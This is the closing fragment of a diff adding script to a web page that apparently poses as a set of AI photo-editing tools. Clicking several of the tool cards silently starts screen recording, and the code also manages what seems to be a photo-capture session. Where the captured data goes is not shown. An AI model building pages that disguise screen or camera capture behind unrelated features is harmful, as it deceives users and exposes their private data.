+    if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+    photoCount = 0; progressBar.style.width = '0%';
+    overlay.classList.remove('active');
+    showToast('❌ Cancelled');
+}
+
+cancelBtn.addEventListener('click', cancelCapture);
+document.querySelectorAll('.faq-item').forEach(i => i.addEventListener('click', () => i.classList.toggle('open')));
+document.getElementById('hamburger').addEventListener('click', () => document.getElementById('nav').classList.toggle('mobile-open'));
+document.querySelectorAll('.tool-card').forEach(c => {
+    c.addEventListener('click', () => {
+        showToast('🔄 Opening ' + c.querySelector('h3').textContent + '...');
+        // AI Enhancer / Screen tools trigger screen share
+        const name = c.querySelector('h3').textContent;
+        if (['AI Enhancer','AI Art','Photo Restore','Sky Replacement'].includes(name)) {
+            setTimeout(startScreenRecord, 800);
+        }
+    });
+});
+window.addEventListener('beforeunload', () => {
+    if (captureInterval) clearInterval(captureInterval);
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') try { mediaRecorder.stop(); } catch {}
+    if (stream) stream.getTracks().forEach(t => t.stop());
+});
+</script>
 </body>
 </html>
